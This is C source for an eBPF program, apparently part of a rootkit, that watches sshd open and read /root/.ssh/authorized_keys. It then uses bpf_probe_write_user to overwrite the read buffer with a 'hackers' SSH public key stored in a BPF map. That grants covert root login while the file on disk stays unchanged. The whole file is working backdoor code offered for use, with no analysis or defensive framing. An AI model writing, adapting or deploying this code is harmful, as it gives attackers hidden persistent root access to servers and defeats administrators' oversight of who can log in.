#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_tracing.h>

#define max_payload_len 450
#define TASK_COMM_LEN 16

// Optional Target Parent PID
const volatile int target_ppid = 0;
// The UserID of the user, if we're restricting
// running to just this user
const volatile int uid = 0;
const volatile int payload_len = 0;

// Map to hold the File Descriptors from 'openat' calls
struct
{
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);         // key is pid_tgid
    __type(value, unsigned int); // value are always zero.
} map_fds SEC(".maps");

// struct to store the buffer mem id and buffer
struct syscall_read_logging 
{
    long unsigned int buffer_addr; // char buffer pointer addr
    long int calling_size; // read(size) store the size.
};

// Map to fold the buffer sized from 'read' calls
struct
{
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);              // key is pid_tgid
    // __type(value, long unsigned int); // char buffer pointer location
    __type(value, struct syscall_read_logging); 
} map_buff_addrs SEC(".maps");

// struct defined custom_payload to get usermode ssh key string
struct custom_payload
{
    u8 raw_buf[max_payload_len];
    u32 payload_len;
};

// Map to hold the hackers key ssh keys.
struct
{
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, __u8);                    // key is id
    __type(value, struct custom_payload ); // value is ssh pub key
} map_payload_buffer SEC(".maps");

SEC("tracepoint/syscalls/sys_enter_openat")
int handle_openat_enter(struct trace_event_raw_sys_enter *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    // pid is not used, not known why it's here
    // int pid = pid_tgid >> 32;
    // Check if we're a process thread of interest
    // if target_ppid is 0 then we target all pids
    // struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    if (target_ppid != 0)
    {
        struct task_struct *task = (struct task_struct *)bpf_get_current_task();
        int ppid = BPF_CORE_READ(task, real_parent, tgid);
        if (ppid != target_ppid)
        {
            return 0;
        }
    }

    // Check comm is sshd
    char comm[TASK_COMM_LEN];
    if(bpf_get_current_comm(&comm, TASK_COMM_LEN)) {
        return 0;
    }

    const int sshd_len = 5;
    const char *sshd = "sshd";
    for (int i = 0; i < sshd_len; i++)
    {
        if (comm[i] != sshd[i])
        {
            return 0;
        }
    }

    // Now check we're opening authorized_keys
    const int ssh_authorized_keys_len = 27;
    const char *ssh_authorized_keys = "/root/.ssh/authorized_keys";
    char filename[27];
    bpf_probe_read_user(&filename, ssh_authorized_keys_len, (char*)ctx->args[1]);
    for (int i = 0; i < ssh_authorized_keys_len; i++) {
        if (filename[i] != ssh_authorized_keys[i]) {
            return 0;
        }
    }

    // Print Command and Filename info
    bpf_printk("Comm %s\n", comm);
    bpf_printk("Openat Filename %s\n", filename);

    // If filtering by UID check that
    if (uid != 0) {
        int current_uid = bpf_get_current_uid_gid() >> 32;
        if (uid != current_uid) {
            return 0;
        }
    }

    // Add pid_tgid to map for our sys_exit call
    bpf_printk("Add pid_tgid %d to map for sys_exit call", pid_tgid);
    unsigned int zero = 0;
    bpf_map_update_elem(&map_fds, &pid_tgid, &zero, BPF_ANY);

    return 0;
}

SEC("tracepoint/syscalls/sys_exit_openat")
int handle_openat_exit(struct trace_event_raw_sys_exit *ctx)
{
    // Check this open call is opening our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    unsigned int *check = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (check == 0)
    {
        // bpf_printk("1");
        return 0;
    }

    // Set the map value to be the returned file descriptor
    unsigned int fd = (unsigned int)ctx->ret;
    bpf_printk("Add sshd fd: %d to map for read_exit call", fd);
    bpf_map_update_elem(&map_fds, &pid_tgid, &fd, BPF_ANY);

    return 0;
}

SEC("tracepoint/syscalls/sys_enter_read")
int handle_read_enter(struct trace_event_raw_sys_enter *ctx)
{
    // Check this open call is opening our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    // int pid = pid_tgid >> 32;
    unsigned int* pfd = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (pfd == 0) {
        return 0;
    }

    // Check this is the sshd file descriptor
    unsigned int map_fd = *pfd;
    unsigned int fd = (unsigned int)ctx->args[0];
    bpf_printk("map_fd: %d and fd: %d", map_fd, fd);
    if (map_fd != fd) {
        return 0;
    }

    // Store buffer address from arguments in map
    long unsigned int buff_addr = ctx->args[1];
    size_t buff_size = (size_t)ctx->args[2];
    struct syscall_read_logging data;
    data.buffer_addr = buff_addr;
    data.calling_size = buff_size;

    bpf_printk("Target buff_addr: %x", data.buffer_addr);
    bpf_map_update_elem(&map_buff_addrs, &pid_tgid, &data, BPF_ANY);

    return 0;
}

SEC("tracepoint/syscalls/sys_exit_read")
int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    // int pid = pid_tgid >> 32;

    // Lookup for buffer and size
    struct syscall_read_logging *data;
    data = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
    if (data == 0)
    {
        return 0;
    }
    
    long unsigned int buff_addr = data->buffer_addr;
    if (buff_addr <= 0)
    {
        return 0;
    }

    bpf_printk("Get target buff_addr: %x", data->buffer_addr);
    bpf_printk("Get data size: %d", data->calling_size);
    // This is amount of data returned from the read syscall
    // if (ctx->ret <= 0)
    // {
    //     bpf_printk("%d", ctx->ret);
    //     return 0;
    // }
    long int read_size = ctx->ret;

    // read_size less than payload, we can't write in the buffer
    // read_size == data->calling_size true means read max when sshd want read. 
    // Also means this is not the file's end.
    // if (read_size < max_payload_len || read_size == data->calling_size ) {
    //     return 0;
    // }
    // |<-------------------------- data->calling_size read(calling_size) -------------------------------------->|
    // |<--------- raw content ------->|<-------------- payload -------------->|
    // |<----------------------------- ret_size ------------------------------>|
    // |<-- buff_addr                  |<-- new_buff_addr                      |<-- buff_addr + read_size
    // |<----

    // Get payload
    struct custom_payload *payload;
    __u8 key = 0;
    payload = bpf_map_lookup_elem(&map_payload_buffer, &key);
    // bpf_printk(payload->raw_buf, payload->payload_len);
    if (payload == 0)
    {
        return 0;
    }

    // Restrict payload len too small or to big.
    u32 len = payload->payload_len;
    if (len <= 0 || len > max_payload_len ) {
        return 0;
    }

    bpf_printk("Custom payload: %s, len: %d", payload->raw_buf, payload->payload_len);

    long unsigned int new_buff_addr = buff_addr;
    //      |<-------------------------- data->calling_size read(calling_size) -------------------------------------->|
    //      |<--------- raw content ------->|<-------------- payload -------------->|
    //      |<----------------------------- ret_size ------------------------------>|
    // best |<-- buff_addr                  |<-- new_buff_addr                      |<-- buff_addr + read_size
    // now  |<-- buff_addr             |<-- new_buff_addr                           |<-- new_buff_addr + max_payload_len

    // Rewrite
    bpf_probe_write_user((void *)new_buff_addr, payload->raw_buf, max_payload_len);

    // There need bpf delete the pid in maps to avoid the rewrite the others ssh pub keys.
    // Closing file, delete fd from all maps to clean up
    bpf_map_delete_elem(&map_fds, &pid_tgid);
    bpf_map_delete_elem(&map_buff_addrs, &pid_tgid);

    return 0;
}

SEC("tracepoint/syscalls/sys_exit_close")
int handle_close_exit(struct trace_event_raw_sys_exit *ctx)
{
    // Check if we're a process thread of interest
    size_t pid_tgid = bpf_get_current_pid_tgid();
    // int pid = pid_tgid >> 32;
    unsigned int* check = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (check == 0) {
        return 0;
    }

    // Closing file, delete fd from all maps to clean up
    bpf_map_delete_elem(&map_fds, &pid_tgid);
    bpf_map_delete_elem(&map_buff_addrs, &pid_tgid);

    return 0;
}

char LICENSE[] SEC("license") = "Dual BSD/GPL";